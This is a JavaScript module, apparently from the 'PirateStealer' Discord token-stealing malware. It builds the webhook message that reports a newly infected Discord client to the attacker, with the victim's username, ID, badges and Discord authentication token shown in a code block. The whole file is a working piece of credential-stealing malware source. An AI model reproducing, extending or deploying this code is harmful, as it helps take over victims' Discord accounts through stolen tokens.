const { pirateStealerConfig, generateRandomProfileWithPic,  } = require('./utils');

async function firstTimeEmbed(account) {
    account = account || await generateRandomProfileWithPic();
    const {injectionInfo, tag, image, token, id, badges} = account;

    return {      
        username: "PirateStealer",
        embeds: [{
            title: "Discord Initalized",
            color: pirateStealerConfig["embed-color"],
            fields: [{
                name: "Info",
                value: injectionInfo,
                inline: false
            }, {
                name: "Username",
                value: `\`${tag}\``,
                inline: true
            }, {
                name: "ID",
                value: `\`${id}\``,
                inline: true
            }, {
                name: "Badges",
                value: `${badges}`,
                inline: false
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: false
            }],
            author: {
                name: "PirateStealer"
            },
            footer: {
                text: "PirateStealer"
            },
            thumbnail: {
                url: image
            }
        }]
    };
}

module.exports.firstTimeEmbed = firstTimeEmbed;